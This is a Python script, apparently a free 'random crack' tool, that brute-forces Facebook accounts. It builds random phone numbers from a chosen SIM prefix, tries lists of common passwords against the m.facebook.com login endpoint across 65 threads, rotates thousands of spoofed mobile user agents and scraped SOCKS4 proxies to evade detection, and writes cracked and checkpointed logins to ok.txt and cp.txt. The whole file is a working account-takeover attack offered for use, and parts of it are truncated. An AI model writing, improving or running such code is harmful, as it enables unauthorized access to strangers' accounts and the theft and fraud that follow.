import os
try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')
try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
import os
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import zlib
from time import sleep
import os,sys,time,json,random,re,string,platform,base64,platform
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
from bs4 import BeautifulSoup
R = '\x1b[1;91m' 
G = '\x1b[1;92m' 
Y = '\x1b[1;93m' 

ugen = []
for xd in range(5000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('\x1b[1;95m[√] wlcm to free tool')
	os.system('xdg-open https://chat.whatsapp.com/CxwmVApJGUK3dAc4IhRXpX')
prox=open('.prox.txt','r').read().splitlines()


for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for xd in range(3000):
	build_nokiax = ['JDQ39','JZO54K']
	rr = random.randint; rc = random.choice
	miui_v3 = ['-g','-gn','-go','-gn','gzip(gfe)',' swan-mibrowser']
	miui_v1 = ['0','1','2','3','4','5','6','7','8','9','10','11','12']
	miui_v2 = ['0','1','2','3','4','5','6','7','8','9','10','11','14','22','27','36']
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	basa = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr']
	gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
	ugent2 = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
	ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; {str(rc(basa))}; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
	memekk = random.choice([ugent1, ugent2, ugent3])
	ugen.append(memekk)
	
for t in range(10000):
	aa='Mozilla/5.0 (Linux; Android 7.0; '
	b=random.choice(['8.1.0','4','5','6','7','8','9','10','11','12'])
	c='Hisense F102) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S','Mozilla/5.0 (Linux; Android 11; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n') 
		ua=open('.bbnew.txt','r').read().splitlines()


syed =[
'Mozilla/5.0 (Linux; Tizen 2.3; SAMSUNG SM-Z130H) AppleWebKit/537.3 (KHTML, like Gecko) SamsungBrowser/1.0 Mobile Safari/537.3',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900V 4G Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A137F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-T280) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A127M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; moto e5 play) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.03.2.4955',
'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A750F) AppleWebKit/537.36 (KHTML, seperti Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1 Build/HUAWEIDUB-LX1; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/92.0.4515.159 Seluler Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 7.1.1; Moto G (5S) Plus Build/NPSS26.116-26-11)',
'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 seperti Mac OS X) AppleWebKit/605.1.15 (KHTML, seperti Gecko) Mobile/15E148 LightSpeed ​​[FBAN/MessengerLiteForiOS;FBAV/267.1.0.63.120;FBBV/218223117;FBDV/iPhone11 ,2;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBCR/;FBID/ponsel;FBLC/hu_CH;FBOP/0]',
'Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 9 Pro MIUI/V11.0.1.0.QJZEUTI)',
'Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.101 Seluler Safari/537.36 DuckDuckGo/5',
'Mozilla/5.0 (Linux; Android 10; H8314) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; LM-Q910 Build/QKQ1.190918.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 6.0; ZTE BLADE V7 PLUS Build/MRA58K)',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:94.0) Gecko/20100101 Firefox/94.0',
'Mozilla/5.0 (Linux; Android 7.0; SM-N920V) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; vivo 1901) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SM-A505F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FN) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/88.0.4324.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-A405FM Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36 YaApp_Android/10.60 YaSearchBrowser/10.60',
'Dalvik/2.1.0 (Linux; U; Android 7.0; Philips S318 Build/NRD90M)',
'Dalvik/2.1.0 (Linux; U; Android 9; FLA-LX3 Build/HUAWEIFLA-L23)',
'Mozilla/5.0 (Linux; Android 9; moto g(8) play Build/PMD29.70-85-4) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; Hisense Rock 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 6.0; VIE-L29 Build/HUAWEIVIE-L29)',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-J337T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; LND-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; CPH2067 Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36',]
logo = """
          \033[1;97m
$$\   $$\  $$$$$$\  $$$$$$$$\ $$$$$$$\   $$$$$$\ $$$$$$$$\ 
\033[1;37m$$ |  $$ |$$  __$$\ \____$$  |$$  __$$\ $$  __$$\\__$$  __|
\033[1;32m$$ |  $$ |$$ /  $$ |    $$  / $$ |  $$ |$$ /  $$ |  $$ |   
\033[1;32m$$$$$$$$ |$$$$$$$$ |   $$  /  $$$$$$$  |$$$$$$$$ |  $$ |   
\033[1;32m$$  __$$ |$$  __$$ |  $$  /   $$  __$$< $$  __$$ |  $$ |   
\033[1;39m$$ |  $$ |$$ |  $$ | $$  /    $$ |  $$ |$$ |  $$ |  $$ |   
\033[1;39m$$ |  $$ |$$ |  $$ |$$$$$$$$\ $$ |  $$ |$$ |  $$ |  $$ |   
\033[1;39m\__|  \__|\__|  \__|\________|\__|  \__|\__|  \__|  \__|   
[+]═══════════════════════════════════════════
\033[1;37m[+] \033[1;37mCREATED BY   :  \033[1;37mRaziqullah Saadat
\033[1;37m[+] \033[1;37mON FACEBOK   :  \033[1;37mMR.HaZraToO
\033[1;37m[+] \033[1;37mON GITHUB    :  \033[1;37mHaZraToO-143
\033[1;37m[+] \033[1;37mTOOL STATUS  :  \033[1;37mFREE
\033[1;37m[+] \033[1;37mTOOL VIRSION :  \033[1;31m4.0.8
\x1b[1;97m[+]═══════════════════════════════════════════"""
loop = 0
oks = []
cps = []


		
def menu():
	os.system('clear')
	print(logo)
	print('[1] START RANDOM CARACK M [1]FOR AFGHANISTAN') 
	print('[2] START RANDOM CARACK M [2]FORM RAFI ULLAH') 
	print('[3] START RANDOM CARACK M [3]FORM AFG KING') 
	print('[4] START RANDOM CARACK M [4]FORM HAZRAT') 
	print('[5] START RANDOM CARACK M [5]FOR PAKISTAN') 
	print('[6] START RANDOM CARACK M [1] FOR INDIA') 
	print('[+]═══════════════════════════════════════════')
	opt = input('[√] SELECT OPT: ')
	if opt =='1':
		random_number1()
	elif opt =='2':
		random_number2()
	elif opt =='3':
		random_number3()
	elif opt =='4':
		random_number4()
	if opt =='5':
		random_number5()
	if opt =='6':
		random_number6()
	
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		menu()
#____
def random_number1():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :9318,9345,9323,9306.ETC')
	print('[+]═══════════════════════════════════════════')
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	limit = int(input('[+]How many numbers do you want to add ? '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[√] Total Ids :'+tl)
		print('[√] your choice code : \x1b[1;92m'+kode)
		print('[√] \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
		print('[+]═══════════════════════════════════════════') 
		for guru in uid:
			uid = kode+guru
			pwx = [kode, kode+guru,'khankhan','khan1122','khankhan','khan12','khan123','khankhan123','khan1234','1234567','khankhan1122','khankhan12345','khankhankhan','786786','khan1122','khan123456','khankhankhan1122']
			yaari.submit(mcrack,uid,pwx,tl)
	print(47*"—") 
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	print(47*"—") 
	input('Press Enter To Go Back To Menu')
	menu()
#____
def random_number2():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :9318,92345,9323,92306.ETC')
	print('[+]═══════════════════════════════════════════')
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	limit = int(input('[+]How many numbers do you want to add ? '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[√] Total Ids :'+tl)
		print('[√] your choice code : \x1b[1;92m'+kode)
		print('[√] \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
		print('[+]═══════════════════════════════════════════') 
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode,'khan12','khan12345','khankhan12345','khankhan','khankhan','khan12','khan123','khankhan123','khan1234','1234567','khankhan1122','khankhan12345','khankhankhan','786786','khan1122','khan123456','khankhankhan1122']
			yaari.submit(fcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	input('Press Inter To Back Menu')
	menu()
#____________
def random_number6():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :91****,91***,91*****,91****.ETC')
	print('[+]═══════════════════════════════════════════')
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	limit = int(input('[+]How many numbers do you want to add ? '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[√] Total Ids :'+tl)
		print('[√] your choice code : \x1b[1;92m'+kode)
		print('[√] \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
		print('[+]═══════════════════════════════════════════') 
		for guru in uid:
			uid = kode+guru
			pwx = [kode, kode+guru,'khankhan','khan12','khan123','khankhan123','khan1234','1234567','khankhan1122','khankhan12345','khankhankhan','786786','khan1122','khan123456','khankhankhan1122']
			yaari.submit(mcrack,uid,pwx,tl)
	print(47*"—") 
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	print(47*"—") 
	input('Press Enter To Go Back To Menu')
	menu()
	
def mcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global ugen
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mMR.HaZraToO\033[1;97m] [%s] OK:-%s \r'%(loop,len(oks))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			free_fb = session.get('https://m.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'m.facebook.com',
			'method': 'GET',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '"Google Chrome";v="101", "Not)A;Brand";v="99", "Chromium";v="105"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'referer':'https://p.facebook.com/',
			'upgrade-insecure-requests': '1',
			'user-agent': ua}
			lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\033[1;92m[HaZraToO-OK] '+cid+' | '+ps+'\033[1;32m')
				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(cid) 
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
	except:
		pass
#_______
def random_number3():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
	print('[+]═══════════════════════════════════════════')
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	limit = int(input('[+]How many numbers do you want to add ? '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[√] Total Ids :'+tl)
		print('[√] your choice code : \x1b[1;92m'+kode)
		print('[√] \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
		print('[+]═══════════════════════════════════════════') 
		for guru in uid:
			uid = kode+guru
			pwx = [guru,'khankhan','khan12','khan123','khankhan123','khan1234','1234567','khankhan1122','khankhan12345','khankhankhan','786786','khan1122','khan123456','khankhankhan1122']
			yaari.submit(fcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
